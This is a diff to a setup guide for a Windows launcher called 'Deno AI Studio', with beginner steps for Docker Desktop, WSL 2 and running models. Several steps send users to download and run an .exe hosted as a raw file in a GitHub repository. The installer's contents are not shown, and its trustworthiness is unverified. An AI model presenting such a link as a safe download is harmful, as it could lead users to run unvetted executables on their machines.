@@ -8,10 +8,30 @@
 | 2 | [Install WSL 2](https://learn.microsoft.com/en-us/windows/wsl/install) | Required Windows backend for Docker Desktop |
 | 3 | [Download Deno AI Studio](https://raw.githubusercontent.com/Deno2026/Workflow/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.3.exe) | Windows installer for the launcher |
 
+## Beginner install guide
+
+Use this order if you are setting it up for the first time:
+
+1. Install Docker Desktop
+2. Install WSL 2
+3. Install Deno AI Studio
+4. Open Docker Desktop once
+5. Open Deno AI Studio and install your first model
+
 ## Install Docker Desktop first
 
 - [Download Docker Desktop for Windows](https://docs.docker.com/desktop/setup/install/windows-install/)
 - [Install WSL on Windows](https://learn.microsoft.com/en-us/windows/wsl/install)
+
+## Which Docker file should I download?
+
+Most users should choose:
+
+- **Docker Desktop for Windows - x86_64**
+
+That is the correct version for most Intel and AMD Windows PCs.
+
+Only choose the Arm version if you know your PC is a Windows-on-Arm device.
 
 ## Why Docker is required
 
@@ -41,31 +61,73 @@ For most beginners, the easiest path is:
 
 ## Easiest WSL 2 install method
 
-1. Open **PowerShell as Administrator**
-2. Run:
+1. Click the **Windows Start button**
+2. Type **PowerShell**
+3. Right-click **Windows PowerShell**
+4. Click **Run as administrator**
+5. If Windows asks for permission, click **Yes**
+6. Run:
 
 ```powershell
 wsl --install
 ```
 
-3. Wait until Windows finishes the setup
-4. Restart Windows if asked
-5. Open Docker Desktop again after the restart
+7. Wait until Windows finishes the setup
+8. Restart Windows if asked
+9. Open Docker Desktop again after the restart
 
 If the command says WSL is already installed, you can continue.
 
 ## Step-by-step setup
 
-1. Click [Download Docker Desktop for Windows](https://docs.docker.com/desktop/setup/install/windows-install/).
-2. Run the Docker Desktop installer with the default settings.
-3. If Docker Desktop or Windows tells you that WSL 2 is required, click the WSL link above and complete that setup.
-4. Restart Windows if asked.
-5. Open Docker Desktop once and wait until it is fully running.
-6. Click [Deno AI Studio](https://raw.githubusercontent.com/Deno2026/Workflow/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.3.exe) to download the installer.
-7. Run the installer and finish setup.
-8. Open **Deno AI Studio** from the desktop or Start menu.
-9. Choose your language from the top-left language menu.
-10. Pick a model from the catalog and click **Start**.
-11. Click **Install** the first time you use a model.
-12. Add files only when a model requires them.
-13. Run the model and open the output folder from inside the app.
+### Part 1. Install Docker Desktop
+
+1. Click [Install Docker Desktop](https://docs.docker.com/desktop/setup/install/windows-install/).
+2. On the Docker page, download **Docker Desktop for Windows - x86_64**.
+3. Wait for the download to finish.
+4. Double-click `Docker Desktop Installer.exe`.
+5. If Windows asks for permission, click **Yes**.
+6. Keep the default installer settings.
+7. If you see an option related to **Use WSL 2**, leave it turned on.
+8. Finish the Docker installation.
+
+### Part 2. Install WSL 2
+
+1. Click [Install WSL 2](https://learn.microsoft.com/en-us/windows/wsl/install/).
+2. Open **PowerShell as Administrator**:
+   - click the **Windows Start button**
+   - type **PowerShell**
+   - right-click **Windows PowerShell**
+   - click **Run as administrator**
+3. Run:
+
+```powershell
+wsl --install
+```
+
+4. Wait until Windows finishes the installation.
+5. Restart Windows if asked.
+
+### Part 3. Open Docker Desktop once
+
+1. Open **Docker Desktop**.
+2. Accept the terms if Docker asks.
+3. Wait until Docker finishes starting.
+4. Do not continue until Docker is fully open and no longer showing a loading state.
+
+### Part 4. Install Deno AI Studio
+
+1. Click [Download Deno AI Studio](https://raw.githubusercontent.com/Deno2026/Workflow/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.3.exe).
+2. Run the installer.
+3. Finish setup.
+4. Open **Deno AI Studio** from the desktop or Start menu.
+5. Choose your language from the top-left language menu.
+
+### Part 5. Install and run your first model
+
+1. Pick a model from the catalog and click **Start**.
+2. Click **Install** the first time you use that model.
+3. Wait until the model setup is finished.
+4. Add files only when the model requires them.
+5. Click **Run**.
+6. Open the output folder from inside the app after the run is finished.
